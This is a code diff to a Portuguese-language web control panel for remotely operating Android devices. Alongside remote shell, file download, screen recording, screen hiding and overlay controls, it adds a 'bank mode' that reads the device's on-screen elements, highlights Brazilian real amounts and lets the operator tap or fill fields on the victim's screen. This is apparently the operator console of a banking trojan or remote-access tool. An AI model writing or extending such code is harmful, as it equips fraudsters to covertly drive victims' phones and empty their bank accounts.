@@ -39,6 +39,8 @@ input{flex:1;cursor:text}
 .dot.on{background:#3fb950}.dot.warn{background:#d29922}
 .row{display:flex;justify-content:space-between;gap:6px;padding:2px 0;border-bottom:1px solid #1a2028;cursor:pointer}
 .row:hover{background:#161c23}
+.row.edit{border-left:2px solid #3fb950;padding-left:5px}
+.row.money span:first-child{color:#3fb950;font-weight:600;font-size:13px}
 .tap{position:fixed;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid #58a6ff;border-radius:50%;pointer-events:none;animation:f .42s ease-out forwards}
 @keyframes f{to{transform:scale(1.7);opacity:0}}
 </style>
@@ -54,13 +56,14 @@ input{flex:1;cursor:text}
 <button onclick="c('hide',{on:true})">Ocultar</button><button onclick="c('hide',{on:false})">Mostrar</button>
 <button onclick="preset(1)">Rapido</button><button onclick="preset(2)">Nitido</button>
 <button onclick="c('ov',{on:true})">Overlay</button><button onclick="c('ov',{on:false})">Overlay off</button>
-<button onclick="c('bank')">Modo banco</button><button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
+<button onclick="banco()">Modo banco</button><button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
 </header>
 <main><div id=wrap><img id=scr><div id=st></div></div>
 <aside>
-<div id=tabs><b class=on data-t=log>log</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
+<div id=tabs><b class=on data-t=log>log</b><b data-t=txt>texto</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
 <div id=body>
 <div id=arqbar style="display:none"><div class=ln><input id=p value="/sdcard"><button onclick="ls()">ir</button></div><div id=flist></div></div>
+<div id=tlist style="display:none"></div>
 <pre id=out></pre>
 </div>
 <div style="padding:5px;border-top:1px solid #232b35">
@@ -75,7 +78,7 @@ input{flex:1;cursor:text}
 <script>
 const T=new URLSearchParams(location.search).get('t')||'';
 const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),out=$('#out');
-let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard';
+let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard',pend=null,tmr=null;
 const log=x=>{out.textContent+=x+'\n';out.scrollTop=out.scrollHeight};
 function co(){
   w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
@@ -102,6 +105,7 @@ function co(){
       else if(x.t==='apps'&&tabNow==='apps'){out.textContent=x.o;out.scrollTop=0}
       else if(x.t==='ls'){lista(x.o)}
       else if(x.t==='dl'){baixa(x.o)}
+      else if(x.t==='tree'){if(tabNow==='txt')renderTree(x.o)}
       else if(x.t==='info'&&tabNow==='info'){out.textContent=x.o}
       else log(x.t+': '+(x.o||''))}
   };
@@ -121,7 +125,10 @@ function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'ne
 dev.onchange=pick;
 function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
 function k(n){c('key',{code:n})}
-function send(){const e=$('#t'),v=e.value;if(!v)return;
+function send(){const e=$('#t'),v=e.value;
+  if(pend){c('fill',{x:pend.x,y:pend.y,s:v});pend=null;e.value='';
+    e.placeholder='texto  |  $comando  |  /ls path  |  /dl path';return}
+  if(!v)return;
   if(v[0]==='$')c('shell',{cmd:v.slice(1)});
   else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
   else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
@@ -160,8 +167,32 @@ function rec(){
 function tab(n){tabNow=n;
   document.querySelectorAll('#tabs b').forEach(b=>b.classList.toggle('on',b.dataset.t===n));
   $('#arqbar').style.display=n==='arq'?'block':'none';
-  out.style.display=n==='arq'?'none':'block';
+  $('#tlist').style.display=n==='txt'?'block':'none';
+  out.style.display=(n==='arq'||n==='txt')?'none':'block';
+  clearInterval(tmr);
+  if(n==='txt'){c('tree');tmr=setInterval(()=>{if(tabNow==='txt')c('tree')},1300)}
   if(n==='apps')c('apps');if(n==='arq')ls();if(n==='info')c('info')}
+function renderTree(a){
+  const f=$('#tlist');f.innerHTML='';
+  if(!a||!a.length){const v=document.createElement('div');v.className='sm';
+    v.textContent='nada legivel nesta tela';f.appendChild(v);return}
+  a.forEach(n=>{
+    const d=document.createElement('div');
+    d.className='row'+(n.e?' edit':'');
+    const rot=n.t||('['+(n.cls||'?')+']');
+    if(/R\$\s?[\d.,]+/.test(rot))d.classList.add('money');
+    const s1=document.createElement('span');s1.textContent=rot;
+    const s2=document.createElement('span');s2.className='sm';
+    s2.textContent=n.e?'campo':(n.c?'toque':'');
+    d.appendChild(s1);d.appendChild(s2);
+    d.onclick=()=>{
+      if(n.e){pend={x:n.x,y:n.y};const e=$('#t');e.value='';
+        e.placeholder='digite e Enviar para preencher o campo';e.focus()}
+      else c('tap',{x:n.x,y:n.y})};
+    f.appendChild(d)})
+}
+function banco(){c('bank');tab('txt');
+  const q=$('#q'),f=$('#f');q.value=30;f.value=2;c('q',{v:30});c('fps',{v:2})}
 document.querySelectorAll('#tabs b').forEach(b=>b.onclick=()=>tab(b.dataset.t));
 function ls(){pasta=$('#p').value||'/sdcard';c('ls',{p:pasta})}
 function lista(o){
